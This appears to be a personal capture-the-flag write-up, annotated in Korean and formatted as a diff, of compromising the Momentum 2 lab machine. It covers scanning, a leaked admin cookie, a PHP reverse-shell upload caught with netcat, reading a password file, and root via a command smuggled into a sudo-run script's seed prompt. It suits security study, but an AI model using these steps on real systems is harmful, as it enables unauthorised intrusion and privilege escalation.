@@ -1,0 +1,225 @@
+<< momemtum2 >> 
+80027DA1530 : 맥주소
+
+sudo netdiscover -R
+	>> 192.168.16.129 ip 주소 찾음
+
+sudo nmap -A -v -p- 192.168.16.129
+	>> 포트 22번, 80번 찾음
+
+
+gobuster dir -u http://192.168.16.129 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.16.129
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+img                  (Status: 301) [Size: 314] [--> http://192.168.16.129/img/]
+css                  (Status: 301) [Size: 314] [--> http://192.168.16.129/css/]
+manual               (Status: 301) [Size: 317] [--> http://192.168.16.129/manual/]
+js                   (Status: 301) [Size: 313] [--> http://192.168.16.129/js/]
+owls                 (Status: 301) [Size: 315] [--> http://192.168.16.129/owls/]
+server-status        (Status: 403) [Size: 279]
+
+	>> 하위 폴더들 찾음
+
+js > main.js
+
+function uploadFile() {
+
+    var files = document.getElementById("file").files;
+ 
+    if(files.length > 0 ){
+ 
+       var formData = new FormData();
+       formData.append("file", files[0]);
+ 
+       var xhttp = new XMLHttpRequest();
+ 
+       // Set POST method and ajax file path
+       xhttp.open("POST", "ajax.php", true);
+ 
+       // call on request changes state
+       xhttp.onreadystatechange = function() {
+          if (this.readyState == 4 && this.status == 200) {
+ 
+            var response = this.responseText;
+            if(response == 1){
+               alert("Upload successfully.");
+            }else{
+               alert("File not uploaded.");
+            }
+          }
+       };
+ 
+       // Send request with data
+       xhttp.send(formData);
+ 
+    }else{
+       alert("Please select a file");
+    }
+ 
+ }
+
+	>> 이 내용 찾음
+
+sudo gobuster dir -u http://192.168.16.129 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,txt,php,bak,php.bak
+	>> 다시 검색
+index.html           (Status: 200) [Size: 1428]
+img                  (Status: 301) [Size: 314] [--> http://192.168.16.129/img/]
+css                  (Status: 301) [Size: 314] [--> http://192.168.16.129/css/]
+ajax.php             (Status: 200) [Size: 0]
+ajax.php.bak         (Status: 200) [Size: 357]
+manual               (Status: 301) [Size: 317] [--> http://192.168.16.129/manual/]
+js                   (Status: 301) [Size: 313] [--> http://192.168.16.129/js/]
+dashboard.html       (Status: 200) [Size: 513]
+owls                 (Status: 301) [Size: 315] [--> http://192.168.16.129/owls/]
+server-status        (Status: 403) [Size: 279]
+
+/ajax.php.bak 
+	이건 파일 다운됨 내용 확인해보면
+ //The boss told me to add one more Upper Case letter at the end of the cookie
+   if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){
+
+       //[+] Add if $_POST['secure'] == 'val1d'
+        $valid_ext = array("pdf","php","txt");
+   }
+   else{
+
+        $valid_ext = array("txt");
+   }
+
+	>> 쿠키 마지막에 대문자 어떤걸 추가하면 된다는 말
+
+
+/dashboard.html 들어가보니
+	파일 올리는 거 있음
+
+ls /usr/share/webshells/php
+	php-reverse-shell.php 사용
+
+sudo vi /usr/share/webshells/php/php-reverse-shell.php
+	49, 50 번 줄
+	ip, port 수정 : ip는 공격자인 kali 꺼, 포트는 그냥 5555로
+
+
+
+프록시란?
+
+Burp suite 에서 Proxy Intercept 한 뒤
+
+------geckoformboundary220687f9f7aa8104799ee7026bd3c15
+Content-Disposition: form-data; name="file"; filename="rshell.php"
+Content-Type: application/x-php
+위에
+------geckoformboundary220687f9f7aa8104799ee7026bd3c15
+Content-Disposition: form-data; name="secure"; 
+
+val1d
+
+넣는다	>> php.bak에 있는 힌트를 바탕으로
+
+Cookie: admin=&G6u@B6uDXMq&Ms
+뒤에 payloads 값 넣고 대문자를 랜덤 브루트 공격으로 찾아냄
+	>>R 인걸 찾아낸다
+
+해당 쿠키 값 넣고 업로드 한다.
+
+
+sudo nc -lvnp 5555 
+>> 프록시 인터셉트 끄고
+	rshell.php 를 실행한다.
+
+
+┌──(kali㉿kali-Attacker)-[~/다운로드]
+└─$ sudo nc -lvnp 5555  
+[sudo] kali 암호: 
+listening on [any] 5555 ...
+connect to [192.168.16.98] from (UNKNOWN) [192.168.16.129] 46022
+Linux momentum2 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+ 23:04:48 up  2:27,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls home
+athena
+team-tasks
+$ ls /home/athena
+password-reminder.txt
+user.txt
+$ cat /home/athena/user.txt
+/                         \
+~ Momentum 2 ~ User Owned ~
+\                         /
+
+---------------------------------------------------
+FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
+---------------------------------------------------
+	>> 플래그는 찾음
+
+
+
+$ cat /home/athena/password-reminder.txt
+password : myvulnerableapp[Asterisk]
+
+	>>myvulnerableapp*
+	>> 비밀번호찾음
+
+kali㉿kali-Attacker)-[~/다운로드]
+└─$ sudo ssh athena@192.168.16.129
+
+
+athena@momentum2:~$ id
+uid=1000(athena) gid=1000(athena) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+athena@momentum2:~$ whoami
+athena
+
+
+athena@momentum2:~$ sudo -l
+Matching Defaults entries for athena on momentum2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+
+User athena may run the following commands on momentum2:
+    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
+athena@momentum2:~$
+~ Random Cookie Generation ~
+[!] for security reasons we keep logs about cookie seeds.
+Enter the seed : 21;cp /bin/bash /tmp/bash; chmod u+s /tmp/bash
+eSBUKhGK$adgFTAXRdRT
+21
+
+
+athena@momentum2:~$ /tmp/bash -p
+bash-5.0# whoami
+root
+bash-5.0# id
+uid=1000(athena) gid=1000(athena) euid=0(root) groups=1000(athena),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+	>> setUID 권한 받은거 확인
+
+bash-5.0# cd /root
+bash-5.0# ls
+root.txt
+bash-5.0# cat root.txt
+//                    \\
+}  Rooted - Momentum 2 {
+\\                    //
+
+---------------------------------------------------
+FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
+---------------------------------------------------
+
+
+by Alienum with <3
+	>> 루트 플래그도 획득
+
+
